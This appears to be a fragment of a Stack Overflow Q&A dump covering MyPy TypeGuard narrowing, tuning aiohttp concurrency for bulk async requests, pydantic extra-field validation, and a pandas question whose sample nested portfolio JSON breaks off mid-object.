<p>You can define a subclass of your primary subclass, where the types of any parameters whose types are affected are explicitly redeclared.</p>
<pre class=""lang-py prettyprint-override""><code>class MyIntClass(MyClass):
    maybe_num: int
</code></pre>
<p>From there, your checker function should still return a boolean, but the annotated return type tells MyPy that it should use it for type narrowing to the listed type.</p>
<p>Sadly it will only do this for proper function parameters, rather than the implicit <code>self</code> argument, but this can be fixed easily enough by providing self explicitly as follows:</p>
<pre class=""lang-py prettyprint-override""><code>if MyClass.has_a_num(self):
    ...
</code></pre>
<p>That syntax is yucky, but it works with MyPy.</p>
<p>This makes the full solution be as follows</p>
<pre class=""lang-py prettyprint-override""><code># Parse type annotations as strings to avoid 
# circular class references
from __future__ import annotations
from typing import Optional, TypeGuard

class MyClass:
    def __init__(self, maybe_num: Optional[int]):
        self.maybe_num = maybe_num

    def has_a_num(self) -&gt; TypeGuard[_MyClass_Int]:
        # This annotation defines a type-narrowing operation,
        # such that if the return value is True, then self
        # is (from MyPy's perspective) _MyClass_Int, and 
        # otherwise it isn't
        return self.maybe_num is not None

    def three_more(self) -&gt; Optional[int]:
        if MyClass.has_a_num(self):
            # No more mypy error
            return self.maybe_num + 3
        else:
            return None

class _MyClass_Int(MyClass):
    maybe_num: int
</code></pre>
<p><code>TypeGuard</code> was added in Python 3.10, but can be used in earlier versions using the <a href=""https://pypi.org/project/typing-extensions/"" rel=""nofollow noreferrer""><code>typing_extensions</code></a> module from <code>pip</code>.</p>
"
"71232879","1","How to speed up async requests in Python","<p>I want to download/scrape 50 million log records from a site. Instead of downloading 50 million in one go, I was trying to download it in parts like 10 million at a time using the following code but it's only handling 20,000 at a time (more than that throws an error) so it becomes time-consuming to download that much data. Currently, it takes 3-4 mins to download 20,000 records with the speed of <code>100%|██████████| 20000/20000 [03:48&lt;00:00, 87.41it/s]</code> so how to speed it up?</p>
<pre><code>import asyncio
import aiohttp
import time
import tqdm
import nest_asyncio

nest_asyncio.apply()


async def make_numbers(numbers, _numbers):
    for i in range(numbers, _numbers):
        yield i


n = 0
q = 10000000


async def fetch():
    # example
    url = &quot;https://httpbin.org/anything/log?id=&quot;

    async with aiohttp.ClientSession() as session:
        post_tasks = []
        # prepare the coroutines that poat
        async for x in make_numbers(n, q):
            post_tasks.append(do_get(session, url, x))
        # now execute them all at once

        responses = [await f for f in tqdm.tqdm(asyncio.as_completed(post_tasks), total=len(post_tasks))]


async def do_get(session, url, x):
    headers = {
        'Content-Type': &quot;application/x-www-form-urlencoded&quot;,
        'Access-Control-Allow-Origin': &quot;*&quot;,
        'Accept-Encoding': &quot;gzip, deflate&quot;,
        'Accept-Language': &quot;en-US&quot;
    }

    async with session.get(url + str(x), headers=headers) as response:
        data = await response.text()
        print(data)


s = time.perf_counter()
try:
    loop = asyncio.get_event_loop()
    loop.run_until_complete(fetch())
except:
    print(&quot;error&quot;)

elapsed = time.perf_counter() - s
# print(f&quot;{__file__} executed in {elapsed:0.2f} seconds.&quot;)
</code></pre>
<p>Traceback (most recent call last):</p>
<pre><code>File &quot;C:\Users\SGM\AppData\Local\Programs\Python\Python39\lib\site-packages\aiohttp\connector.py&quot;, line 986, in _wrap_create_connection
    return await self._loop.create_connection(*args, **kwargs)  # type: ignore[return-value]  # noqa
  File &quot;C:\Users\SGM\AppData\Local\Programs\Python\Python39\lib\asyncio\base_events.py&quot;, line 1056, in create_connection
    raise exceptions[0]
  File &quot;C:\Users\SGM\AppData\Local\Programs\Python\Python39\lib\asyncio\base_events.py&quot;, line 1041, in create_connection
    sock = await self._connect_sock(
  File &quot;C:\Users\SGM\AppData\Local\Programs\Python\Python39\lib\asyncio\base_events.py&quot;, line 955, in _connect_sock
    await self.sock_connect(sock, address)
  File &quot;C:\Users\SGM\AppData\Local\Programs\Python\Python39\lib\asyncio\proactor_events.py&quot;, line 702, in sock_connect
    return await self._proactor.connect(sock, address)
  File &quot;C:\Users\SGM\AppData\Local\Programs\Python\Python39\lib\asyncio\tasks.py&quot;, line 328, in __wakeup
    future.result()
  File &quot;C:\Users\SGM\AppData\Local\Programs\Python\Python39\lib\asyncio\windows_events.py&quot;, line 812, in _poll
    value = callback(transferred, key, ov)
  File &quot;C:\Users\SGM\AppData\Local\Programs\Python\Python39\lib\asyncio\windows_events.py&quot;, line 599, in finish_connect
    ov.getresult()
OSError: [WinError 121] The semaphore timeout period has expired

The above exception was the direct cause of the following exception:

Traceback (most recent call last):
  File &quot;C:\Users\SGM\Desktop\xnet\x3stackoverflow.py&quot;, line 136, in &lt;module&gt;
    loop.run_until_complete(fetch())
  File &quot;C:\Users\SGM\AppData\Roaming\Python\Python39\site-packages\nest_asyncio.py&quot;, line 81, in run_until_complete
    return f.result()
  File &quot;C:\Users\SGM\AppData\Local\Programs\Python\Python39\lib\asyncio\futures.py&quot;, line 201, in result
    raise self._exception
  File &quot;C:\Users\SGM\AppData\Local\Programs\Python\Python39\lib\asyncio\tasks.py&quot;, line 256, in __step
    result = coro.send(None)
  File &quot;C:\Users\SGM\Desktop\xnet\x3stackoverflow.py&quot;, line 88, in fetch
    response = await f
  File &quot;C:\Users\SGM\Desktop\xnet\x3stackoverflow.py&quot;, line 37, in _wait_for_one
    return f.result()
  File &quot;C:\Users\SGM\AppData\Local\Programs\Python\Python39\lib\asyncio\futures.py&quot;, line 201, in result
    raise self._exception
  File &quot;C:\Users\SGM\AppData\Local\Programs\Python\Python39\lib\asyncio\tasks.py&quot;, line 258, in __step
    result = coro.throw(exc)
  File &quot;C:\Users\SGM\Desktop\xnet\x3stackoverflow.py&quot;, line 125, in do_get
    async with session.get(url + str(x), headers=headers) as response:
  File &quot;C:\Users\SGM\AppData\Local\Programs\Python\Python39\lib\site-packages\aiohttp\client.py&quot;, line 1138, in __aenter__
    self._resp = await self._coro
  File &quot;C:\Users\SGM\AppData\Local\Programs\Python\Python39\lib\site-packages\aiohttp\client.py&quot;, line 535, in _request
    conn = await self._connector.connect(
  File &quot;C:\Users\SGM\AppData\Local\Programs\Python\Python39\lib\site-packages\aiohttp\connector.py&quot;, line 542, in connect
    proto = await self._create_connection(req, traces, timeout)
  File &quot;C:\Users\SGM\AppData\Local\Programs\Python\Python39\lib\site-packages\aiohttp\connector.py&quot;, line 907, in _create_connection
    _, proto = await self._create_direct_connection(req, traces, timeout)
  File &quot;C:\Users\SGM\AppData\Local\Programs\Python\Python39\lib\site-packages\aiohttp\connector.py&quot;, line 1206, in _create_direct_connection
    raise last_exc
  File &quot;C:\Users\SGM\AppData\Local\Programs\Python\Python39\lib\site-packages\aiohttp\connector.py&quot;, line 1175, in _create_direct_connection
    transp, proto = await self._wrap_create_connection(
  File &quot;C:\Users\SGM\AppData\Local\Programs\Python\Python39\lib\site-packages\aiohttp\connector.py&quot;, line 992, in _wrap_create_connection
    raise client_error(req.connection_key, exc) from exc
aiohttp.client_exceptions.ClientConnectorError: Cannot connect to host example.com:80 ssl:default [The semaphore timeout period has expired]
</code></pre>
","71285322","<h1>Bottleneck: number of simultaneous connections</h1>
<p>First, the bottleneck is the total number of simultaneous connections in the TCP connector.</p>
<p>That default for <code>aiohttp.TCPConnector</code> is <code>limit=100</code>. On most systems (tested on macOS), you should be able to double that by passing a <code>connector</code> with <code>limit=200</code>:</p>
<pre class=""lang-py prettyprint-override""><code># async with aiohttp.ClientSession() as session:
async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=200)) as session:
</code></pre>
<p>The time taken should decrease significantly. (On macOS: <code>q = 20_000</code> decreased 43% from 58 seconds to 33 seconds, and <code>q = 10_000</code> decreased 42% from 31 to 18 seconds.)</p>
<p>The <code>limit</code> you can configure depends on the number of file descriptors that your machine can open. (On macOS: You can run <code>ulimit -n</code> to check, and <code>ulimit -n 1024</code> to increase to 1024 for the current terminal session, and then change to <code>limit=1000</code>. Compared to <code>limit=100</code>, <code>q = 20_000</code> decreased 76% to 14 seconds, and <code>q = 10_000</code> decreased 71% to 9 seconds.)</p>
<h1>Supporting 50 million requests: async generators</h1>
<p>Next, the reason why 50 million requests appears to hang is simply because of its sheer number.</p>
<p>Just creating 10 million coroutines in <code>post_tasks</code> takes 68-98 seconds (varies greatly on my machine), and then the event loop is further burdened with that many tasks, 99.99% of which are blocked by the TCP connection pool.</p>
<p>We can defer the creation of coroutines using an async generator:</p>
<pre class=""lang-py prettyprint-override""><code>async def make_async_gen(f, n, q):
    async for x in make_numbers(n, q):
        yield f(x)
</code></pre>
<p>We need a counterpart to <code>asyncio.as_completed()</code> to handle <code>async_gen</code> and <code>concurrency</code>:</p>
<pre class=""lang-py prettyprint-override""><code>from asyncio import ensure_future, events
from asyncio.queues import Queue

def as_completed_for_async_gen(fs_async_gen, concurrency):
    done = Queue()
    loop = events.get_event_loop()
    # todo = {ensure_future(f, loop=loop) for f in set(fs)}  # -
    todo = set()                                             # +

    def _on_completion(f):
        todo.remove(f)
        done.put_nowait(f)
        loop.create_task(_add_next())  # +

    async def _wait_for_one():
        f = await done.get()
        return f.result()

    async def _add_next():  # +
        try:
            f = await fs_async_gen.__anext__()
        except StopAsyncIteration:
            return
        f = ensure_future(f, loop=loop)
        f.add_done_callback(_on_completion)
        todo.add(f)

    # for f in todo:                           # -
    #     f.add_done_callback(_on_completion)  # -
    # for _ in range(len(todo)):               # -
    #     yield _wait_for_one()                # -
    for _ in range(concurrency):               # +
        loop.run_until_complete(_add_next())   # +
    while todo:                                # +
        yield _wait_for_one()                  # +
</code></pre>
<p>Then, we update <code>fetch()</code>:</p>
<pre class=""lang-py prettyprint-override""><code>from functools import partial

CONCURRENCY = 200  # +

n = 0
q = 50_000_000

async def fetch():
    # example
    url = &quot;https://httpbin.org/anything/log?id=&quot;

    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=CONCURRENCY)) as session:
        # post_tasks = []                                                # -
        # # prepare the coroutines that post                             # -
        # async for x in make_numbers(n, q):                             # -
        #     post_tasks.append(do_get(session, url, x))                 # -
        # Prepare the coroutines generator                               # +
        async_gen = make_async_gen(partial(do_get, session, url), n, q)  # +

        # now execute them all at once                                                                         # -
        # responses = [await f for f in tqdm.asyncio.tqdm.as_completed(post_tasks, total=len(post_tasks))]     # -
        # Now execute them with a specified concurrency                                                        # +
        responses = [await f for f in tqdm.tqdm(as_completed_for_async_gen(async_gen, CONCURRENCY), total=q)]  # +
</code></pre>
<h1>Other limitations</h1>
<p>With the above, the program can <em>start</em> processing 50 million requests but:</p>
<ol>
<li>it will still take 8 hours or so with <code>CONCURRENCY = 1000</code>, based on the estimate from <code>tqdm</code>.</li>
<li>your program may run out of memory for <code>responses</code> and crash.</li>
</ol>
<p>For point 2, you should probably do:</p>
<pre class=""lang-py prettyprint-override""><code># responses = [await f for f in tqdm.tqdm(as_completed_for_async_gen(async_gen, CONCURRENCY), total=q)]
for f in tqdm.tqdm(as_completed_for_async_gen(async_gen, CONCURRENCY), total=q):
    response = await f
    
    # Do something with response, such as writing to a local file
    # ...
</code></pre>
<hr />
<h1>An error in the code</h1>
<p><code>do_get()</code> should <code>return data</code>:</p>
<pre class=""lang-py prettyprint-override""><code>async def do_get(session, url, x):
    headers = {
        'Content-Type': &quot;application/x-www-form-urlencoded&quot;,
        'Access-Control-Allow-Origin': &quot;*&quot;,
        'Accept-Encoding': &quot;gzip, deflate&quot;,
        'Accept-Language': &quot;en-US&quot;
    }

    async with session.get(url + str(x), headers=headers) as response:
        data = await response.text()
        # print(data)  # -
        return data    # +
</code></pre>
"
"71837398","1","Pydantic validations for extra fields that not defined in schema","<p>I am using pydantic for schema validations and I would like to throw an error when any extra field is added to a schema that isn't defined.</p>
<pre><code>from typing import Literal, Union

from pydantic import BaseModel, Field, ValidationError


class Cat(BaseModel):
    pet_type: Literal['cat']
    meows: int


class Dog(BaseModel):
    pet_type: Literal['dog']
    barks: float


class Lizard(BaseModel):
    pet_type: Literal['reptile', 'lizard']
    scales: bool


class Model(BaseModel):
    pet: Union[Cat, Dog, Lizard] = Field(..., discriminator='pet_type')
    n: int


print(Model(pet={'pet_type': 'dog', 'barks': 3.14, 'eats': 'biscuit'}, n=1))
&quot;&quot;&quot; try:
    Model(pet={'pet_type': 'dog'}, n=1)
except ValidationError as e:
    print(e) &quot;&quot;&quot;

</code></pre>
<p>In the above code, I have added the <code>eats</code> field which is not defined. The pydantic validations are applied and the extra values that I defined are removed in response. I wanna throw an error saying <code>eats is not allowed for Dog</code> or something like that. Is there any way to achieve that?</p>
<p>And is there any chance that we can provide the input directly instead of the <code>pet</code> object?<br />
<code>print(Model({'pet_type': 'dog', 'barks': 3.14, 'eats': 'biscuit', n=1}))</code>. I tried without <code>descriminator</code> but those specific validations are missing related to <code>pet_type</code>. Can someone guide me how to achive either one of that?</p>
","71838453","<p>You can use the <a href=""https://pydantic-docs.helpmanual.io/usage/model_config/#options"" rel=""noreferrer""><code>extra</code> field</a> in the <code>Config</code> class to <em>forbid</em> extra attributes during model initialisation (by default, additional attributes will be <em>ignored</em>).</p>
<p>For example:</p>
<pre class=""lang-py prettyprint-override""><code>from pydantic import BaseModel, Extra

class Pet(BaseModel):
    name: str

    class Config:
        extra = Extra.forbid

data = {
    &quot;name&quot;: &quot;some name&quot;,
    &quot;some_extra_field&quot;: &quot;some value&quot;,
}

my_pet = Pet.parse_obj(data)   # &lt;- effectively the same as Pet(**pet_data)
</code></pre>
<p>will raise a <code>VaidationError</code>:</p>
<pre class=""lang-none prettyprint-override""><code>ValidationError: 1 validation error for Pet
some_extra_field
  extra fields not permitted (type=value_error.extra)
</code></pre>
<p>Works as well when the model is &quot;nested&quot;, e.g.:</p>
<pre class=""lang-py prettyprint-override""><code>class PetModel(BaseModel):
    my_pet: Pet
    n: int

pet_data = {
    &quot;my_pet&quot;: {&quot;name&quot;: &quot;Some Name&quot;, &quot;invalid_field&quot;: &quot;some value&quot;},
    &quot;n&quot;: 5,
}

pet_model = PetModel.parse_obj(pet_data)
# Effectively the same as
# pet_model = PetModel(my_pet={&quot;name&quot;: &quot;Some Name&quot;, &quot;invalid_field&quot;: &quot;some value&quot;}, n=5)
</code></pre>
<p>will raise:</p>
<pre class=""lang-none prettyprint-override""><code>ValidationError: 1 validation error for PetModel
my_pet -&gt; invalid_field
  extra fields not permitted (type=value_error.extra)
</code></pre>
"
"71104848","1","Mapping complex JSON to Pandas Dataframe","<p><strong>Background</strong><br>I have a complex nested JSON object, which I am trying to unpack into a pandas <code>df</code> in a very specific way.</p>
<p><strong>JSON Object</strong><br>this is an extract, containing randomized data of the JSON object, which shows examples of the hierarchy (inc. children) for 1x family (i.e. 'Falconer Family'), however there is 100s of them in total and this extract just has 1x family, however the full JSON object has multiple -</p>
<pre><code>{
    &quot;meta&quot;: {
        &quot;columns&quot;: [{
                &quot;key&quot;: &quot;value&quot;,
                &quot;display_name&quot;: &quot;Adjusted Value (No Div, USD)&quot;,
                &quot;output_type&quot;: &quot;Number&quot;,
                &quot;currency&quot;: &quot;USD&quot;
            },
            {
                &quot;key&quot;: &quot;time_weighted_return&quot;,
                &quot;display_name&quot;: &quot;Current Quarter TWR (USD)&quot;,
                &quot;output_type&quot;: &quot;Percent&quot;,
                &quot;currency&quot;: &quot;USD&quot;
            },
            {
                &quot;key&quot;: &quot;time_weighted_return_2&quot;,
                &quot;display_name&quot;: &quot;YTD TWR (USD)&quot;,
                &quot;output_type&quot;: &quot;Percent&quot;,
                &quot;currency&quot;: &quot;USD&quot;
            },
            {
                &quot;key&quot;: &quot;_custom_twr_audit_note_911328&quot;,
                &quot;display_name&quot;: &quot;TWR Audit Note&quot;,
                &quot;output_type&quot;: &quot;Word&quot;
            }
        ],
        &quot;groupings&quot;: [{
                &quot;key&quot;: &quot;_custom_name_747205&quot;,
                &quot;display_name&quot;: &quot;* Reporting Client Name&quot;
            },
            {
                &quot;key&quot;: &quot;_custom_new_entity_group_453577&quot;,
                &quot;display_name&quot;: &quot;NEW Entity Group&quot;
            },
            {
                &quot;key&quot;: &quot;_custom_level_2_624287&quot;,
                &quot;display_name&quot;: &quot;* Level 2&quot;
            },
            {
                &quot;key&quot;: &quot;legal_entity&quot;,
                &quot;display_name&quot;: &quot;Legal Entity&quot;
            }
        ]
    },
    &quot;data&quot;: {
        &quot;type&quot;: &quot;portfolio_views&quot;,
        &quot;attributes&quot;: {
            &quot;total&quot;: {
                &quot;name&quot;: &quot;Total&quot;,
                &quot;columns&quot;: {
                    &quot;time_weighted_return&quot;: -0.046732301295604683,
                    &quot;time_weighted_return_2&quot;: -0.046732301295604683,
                    &quot;_custom_twr_audit_note_911328&quot;: null,
                    &quot;value&quot;: 23132492.905107163
                },
                &quot;children&quot;: [{
                    &quot;name&quot;: &quot;Falconer Family&quot;,
                    &quot;grouping&quot;: &quot;_custom_name_747205&quot;,
                    &quot;columns&quot;: {
                        &quot;time_weighted_return&quot;: -0.046732301295604683,
                        &quot;time_weighted_return_2&quot;: -0.046732301295604683,
                        &quot;_custom_twr_audit_note_911328&quot;: null,
                        &quot;value&quot;: 23132492.905107163
                    },
                    &quot;children&quot;: [{
                            &quot;name&quot;: &quot;Wealth Bucket A&quot;,
                            &quot;grouping&quot;: &quot;_custom_new_entity_group_453577&quot;,
                            &quot;columns&quot;: {
                                &quot;time_weighted_return&quot;: -0.045960317420568164,
                                &quot;time_weighted_return_2&quot;: -0.045960317420568164,
                                &quot;_custom_twr_audit_note_911328&quot;: null,
                                &quot;value&quot;: 13264448.506587159
                            },
                            &quot;children&quot;: [{
                                    &quot;name&quot;: &quot;Asset Class A&quot;,
                                    &quot;grouping&quot;: &quot;_custom_level_2_624287&quot;,
                                    &quot;columns&quot;: {
                                        &quot;time_weighted_return&quot;: 0.000003434094574039648,
                                        &quot;time_weighted_return_2&quot;: 0.000003434094574039648,
                                        &quot;_custom_twr_audit_note_911328&quot;: null,
                                        &quot;value&quot;: 3337.99
                                    },
                                    &quot;children&quot;: [{
                                        &quot;entity_id&quot;: 10604454,
                                        &quot;name&quot;: &quot;HUDJ Trust&quot;,
                                        &quot;grouping&quot;: &quot;legal_entity&quot;,
                                        &quot;columns&quot;: {
                                            &quot;time_weighted_return&quot;: 0.000003434094574039648,
                                            &quot;time_weighted_return_2&quot;: 0.000003434094574039648,
                                            &quot;_custom_twr_audit_note_911328&quot;: null,
                                            &quot;value&quot;: 3337.99
                                        },
                                        &quot;children&quot;: []
                                    }]
                                },
                                {
                                    &quot;name&quot;: &quot;Asset Class B&quot;,
                                    &quot;grouping&quot;: &quot;_custom_level_2_624287&quot;,
                                    &quot;columns&quot;: {
                                        &quot;time_weighted_return&quot;: -0.025871339096964152,
                                        &quot;time_weighted_return_2&quot;: -0.025871339096964152,
                                        &quot;_custom_twr_audit_note_911328&quot;: null,
                                        &quot;value&quot;: 1017004.7192636987
                                    },
                                    &quot;children&quot;: [{
                                        &quot;entity_id&quot;: 10604454,
                                        &quot;name&quot;: &quot;HUDG Trust&quot;,
                                        &quot;grouping&quot;: &quot;legal_entity&quot;,
                                        &quot;columns&quot;: {
                                            &quot;time_weighted_return&quot;: -0.025871339096964152,
                                            &quot;time_weighted_return_2&quot;: -0.025871339096964152,
                                            &quot;_custom_twr_audit_note_911328&quot;: null,
                                            &quot;value&quot;: 1017004.7192636987
                                        },
                                        &quot;children&quot;: []
                                    }]
                                },
                                {
                                    &quot;name&quot;: &quot;Asset Class C&quot;,
                                    &quot;grouping&quot;: &quot;_custom_level_2_624287&quot;,
                                    &quot;columns&quot;: {
                                        &quot;time_weighted_return&quot;: -0.030370376329670656,
                                        &quot;time_weighted_return_2&quot;: -0.030370376329670656,
                                        &quot;_custom_twr_audit_note_911328&quot;: null,
                                        &quot;value&quot;: 231142.67772000004
                                    },
                                    &quot;children&quot;: [{
                                        &quot;entity_id&quot;: 10604454,
                                        &quot;name&quot;: &quot;HKDJ Trust&quot;,
                                        &quot;grouping&quot;: &quot;legal_entity&quot;,
                                        &quot;columns&quot;: {
                                            &quot;time_weighted_return&quot;: -0.030370376329670656,
                                            &quot;time_weighted_return_2&quot;: -0.030370376329670656,
                                            &quot;_custom_twr_audit_note_911328&quot;: null,
                                            &quot;value&quot;: 231142.67772000004
                                        },
                                        &quot;children&quot;: []
                                    }]
                                },
                                {
                                    &quot;name&quot;: &quot;Asset Class D&quot;,
                                    &quot;grouping&quot;: &quot;_custom_level_2_624287&quot;,
                                    &quot;columns&quot;: {
                                        &quot;time_weighted_return&quot;: -0.05382756475465478,
                                        &quot;time_weighted_return_2&quot;: -0.05382756475465478,
                                        &quot;_custom_twr_audit_note_911328&quot;: null,
                                        &quot;value&quot;: 9791282.570000006
                                    },
                                    &quot;children&quot;: [{
                                        &quot;entity_id&quot;: 10604454,
                                        &quot;name&quot;: &quot;HUDW Trust&quot;,
                                        &quot;grouping&quot;: &quot;legal_entity&quot;,
                                        &quot;columns&quot;: {
                                            &quot;time_weighted_return&quot;: -0.05382756475465478,
                                            &quot;time_weighted_return_2&quot;: -0.05382756475465478,
                                            &quot;_custom_twr_audit_note_911328&quot;: null,
                                            &quot;value&quot;: 9791282.570000006
                                        },
                                        &quot;children&quot;: []
                                    }]
                                },
                                {
                                    &quot;name&quot;: &quot;Asset Class E&quot;,
                                    &quot;grouping&quot;: &quot;_custom_level_2_624287&quot;,
                                    &quot;columns&quot;: {
                                        &quot;time_weighted_return&quot;: -0.01351630404081805,
                                        &quot;time_weighted_return_2&quot;: -0.01351630404081805,
                                        &quot;_custom_twr_audit_note_911328&quot;: null,
                                        &quot;value&quot;: 2153366.6396034593
                                    },
                                    &quot;children&quot;: [{
                                        &quot;entity_id&quot;: 10604454,
                                        &quot;name&quot;: &quot;HJDJ Trust&quot;,
                                        &quot;grouping&quot;: &quot;legal_entity&quot;,
                                        &quot;columns&quot;: {
                                            &quot;time_weighted_return&quot;: -0.01351630404081805,
                                            &quot;time_weighted_return_2&quot;: -0.01351630404081805,
                                            &quot;_custom_twr_audit_note_911328&quot;: null,
                                            &quot;value&quot;: 2153366.6396034593
                                        },
                                        &quot;children&quot;: []
                                    }]
                                },
                                {
                                    &quot;name&quot;: &quot;Asset Class F&quot;,
                                    &quot;grouping&quot;: &quot;_custom_level_2_624287&quot;,
                                    &quot;columns&quot;: {
                                        &quot;time_weighted_return&quot;: -0.002298190175237247,
                                        &quot;time_weighted_return_2&quot;: -0.002298190175237247,
                                        &quot;_custom_twr_audit_note_911328&quot;: null,
                                        &quot;value&quot;: 68313.90999999999
                                    },
                                    &quot;children&quot;: [{
                                        &quot;entity_id&quot;: 10604454,
                                        &quot;name&quot;: &quot;HADJ Trust&quot;,
                                        &quot;grouping&quot;: &quot;legal_entity&quot;,
                                        &quot;columns&quot;: {
                                            &quot;time_weighted_return&quot;: -0.002298190175237247,
                                            &quot;time_weighted_return_2&quot;: -0.002298190175237247,
                                            &quot;_custom_twr_audit_note_911328&quot;: null,
                                            &quot;value&quot;: 68313.90999999999
                                        },
                                        &quot;children&quot;: []
                                    }]
                                }
                            ]
                        },
                        {
                            &quot;name&quot;: &quot;Wealth Bucket B&quot;,
                            &quot;grouping&quot;: &quot;_custom_new_entity_group_453577&quot;,
                            &quot;columns&quot;: {
                                &quot;time_weighted_return&quot;: -0.04769870075659244,
                                &quot;time_weighted_return_2&quot;: -0.04769870075659244,
                                &quot;_custom_twr_audit_note_911328&quot;: null,
                                &quot;value&quot;: 9868044.398519998
                            },
                            &quot;children&quot;: [{
                                    &quot;name&quot;: &quot;Asset Class A&quot;,
                                    &quot;grouping&quot;: &quot;_custom_level_2_624287&quot;,
                                    &quot;columns&quot;: {
                                        &quot;time_weighted_return&quot;: 0.000028632718065191298,
                                        &quot;time_weighted_return_2&quot;: 0.000028632718065191298,
                                        &quot;_custom_twr_audit_note_911328&quot;: null,
                                        &quot;value&quot;: 10234.94
                                    },
                                    &quot;children&quot;: [{
                                            &quot;entity_id&quot;: 10868778,
                                            &quot;name&quot;: &quot;2012 Desc Tr HBO Thalia&quot;,
                                            &quot;grouping&quot;: &quot;legal_entity&quot;,
                                            &quot;columns&quot;: {
                                                &quot;time_weighted_return&quot;: 0.0000282679297198829,
                                                &quot;time_weighted_return_2&quot;: 0.0000282679297198829,
                                                &quot;_custom_twr_audit_note_911328&quot;: null,
                                                &quot;value&quot;: 244.28
                                            },
                                            &quot;children&quot;: []
                                        },
                                        {
                                            &quot;entity_id&quot;: 10643052,
                                            &quot;name&quot;: &quot;2013 Irrev Tr HBO Thalia&quot;,
                                            &quot;grouping&quot;: &quot;legal_entity&quot;,
                                            &quot;columns&quot;: {
                                                &quot;time_weighted_return&quot;: 0.000049373572795108345,
                                                &quot;time_weighted_return_2&quot;: 0.000049373572795108345,
                                                &quot;_custom_twr_audit_note_911328&quot;: null,
                                                &quot;value&quot;: 5081.08
                                            },
                                            &quot;children&quot;: []
                                        },
                                        {
                                            &quot;entity_id&quot;: 10598341,
                                            &quot;name&quot;: &quot;Cht 11th Tr HBO Shirley&quot;,
                                            &quot;grouping&quot;: &quot;legal_entity&quot;,
                                            &quot;columns&quot;: {
                                                &quot;time_weighted_return&quot;: 0.000006609603754315074,
                                                &quot;time_weighted_return_2&quot;: 0.000006609603754315074,
                                                &quot;_custom_twr_audit_note_911328&quot;: null,
                                                &quot;value&quot;: 1523.62
                                            },
                                            &quot;children&quot;: []
                                        },
                                        {
                                            &quot;entity_id&quot;: 10598337,
                                            &quot;name&quot;: &quot;Cht 11th Tr HBO Hannah&quot;,
                                            &quot;grouping&quot;: &quot;legal_entity&quot;,
                                            &quot;columns&quot;: {
                                                &quot;time_weighted_return&quot;: 0.000010999769004760296,
                                                &quot;time_weighted_return_2&quot;: 0.000010999769004760296,
                                                &quot;_custom_twr_audit_note_911328&quot;: null,
                                                &quot;value&quot;: 1828.9
                                            },
                                            &quot;children&quot;: []
                                        },
                                        {
                                            &quot;entity_id&quot;: 10598334,
                                            &quot;name&quot;: &quot;Cht 11th Tr HBO Lau&quot;,
                                            &quot;grouping&quot;: &quot;legal_entity&quot;,
                                            &quot;columns&quot;: {
                                                &quot;time_weighted_return&quot;: 0.000006466673995619843,
                                                &quot;time_weighted_return_2&quot;: 0.000006466673995619843,
                                                &quot;_custom_twr_audit_note_911328&quot;: null,
                                                &quot;value&quot;: 1557.06
                                            },
                                            &quot;children&quot;: []
                                        }
                                    ]
                                },
                                {
                                    &quot;name&quot;: &quot;Asset Class B&quot;,
                                    &quot;grouping&quot;: &quot;_custom_level_2_624287&quot;,
                                    &quot;columns&quot;: {
                                        &quot;time_weighted_return&quot;: -0.024645947842438676,
                                        &quot;time_weighted_return_2&quot;: -0.024645947842438676,
                                        &quot;_custom_twr_audit_note_911328&quot;: null,
                                        &quot;value&quot;: 674052.31962
                                    },
                                    &quot;children&quot;: [{
                                            &quot;entity_id&quot;: 10868778,
                                            &quot;name&quot;: &quot;2012 Desc Tr HBO Thalia&quot;,
                                            &quot;grouping&quot;: &quot;legal_entity&quot;,
                                            &quot;columns&quot;: {
                                                &quot;time_weighted_return&quot;: -0.043304004172576405,
                                                &quot;time_weighted_return_2&quot;: -0.043304004172576405,
                                                &quot;_custom_twr_audit_note_911328&quot;: null,
                                                &quot;value&quot;: 52800.96
                                            },
                                            &quot;children&quot;: []
                                        },
                                        {
                                            &quot;entity_id&quot;: 10643052,
                                            &quot;name&quot;: &quot;2013 Irrev Tr HBO Thalia&quot;,
                                            &quot;grouping&quot;: &quot;legal_entity&quot;,
                                            &quot;columns&quot;: {
                                                &quot;time_weighted_return&quot;: -0.022408434778798836,
                                                &quot;time_weighted_return_2&quot;: -0.022408434778798836,
                                                &quot;_custom_twr_audit_note_911328&quot;: null,
                                                &quot;value&quot;: 599594.11962
                                            },
                                            &quot;children&quot;: []
                                        },
                                        {
                                            &quot;entity_id&quot;: 10598341,
                                            &quot;name&quot;: &quot;Cht 11th Tr HBO Shirley&quot;,
                                            &quot;grouping&quot;: &quot;legal_entity&quot;,
                                            &quot;columns&quot;: {
                                                &quot;time_weighted_return&quot;: -0.039799855483646174,
                                                &quot;time_weighted_return_2&quot;: -0.039799855483646174,
                                                &quot;_custom_twr_audit_note_911328&quot;: null,
                                                &quot;value&quot;: 7219.08
                                            },
                                            &quot;children&quot;: []
                                        },
                                        {
                                            &quot;entity_id&quot;: 10598337,
                                            &quot;name&quot;: &quot;Cht 11th Tr HBO Hannah&quot;,
                                            &quot;grouping&quot;: &quot;legal_entity&quot;,
                                            &quot;columns&quot;: {
                                                &quot;time_weighted_return&quot;: -0.039799855483646174,
                                                &quot;time_weighted_return_2&quot;: -0.039799855483646174,
                                                &quot;_custom_twr_audit_note_911328&quot;: null,
                                                &quot;value&quot;: 7219.08
                                            },
                                            &quot;children&quot;: []
                                        },
                                        {
                                            &quot;entity_id&quot;: 10598334,
                                            &quot;name&quot;: &quot;Cht 11th Tr HBO Lau&quot;,
                                            &quot;grouping&quot;: &quot;legal_entity&quot;,
                                            &quot;columns&quot;: {
                                                &quot;time_weighted_return&quot;: -0.039799855483646174,
                                                &quot;time_weighted_return_2&quot;: -0.039799855483646174,
                                                &quot;_custom_twr_audit_note_911328&quot;: null,
                                                &quot;value&quot;: 7219.08
                                            },
                                            &quot;children&quot;: []
                                        }
                                    ]
                                },
                                {
                                    &quot;name&quot;: &quot;Asset Class C&quot;,
                                    &quot;grouping&quot;: &quot;_custom_level_2_624287&quot;,
                                    &quot;columns&quot;: {
                                        &quot;time_weighted_return&quot;: -0.03037038746301135,
                                        &quot;time_weighted_return_2&quot;: -0.03037038746301135,
                                        &quot;_custom_twr_audit_note_911328&quot;: null,
                                        &quot;value&quot;: 114472.69744
                                    },
                                    &quot;children&quot;: [{
                                            &quot;entity_id&quot;: 10868778,
                                            &quot;name&quot;: &quot;2012 Desc Tr HBO Thalia&quot;,
                                            &quot;grouping&quot;: &quot;legal_entity&quot;,
                                            &quot;columns&quot;: {
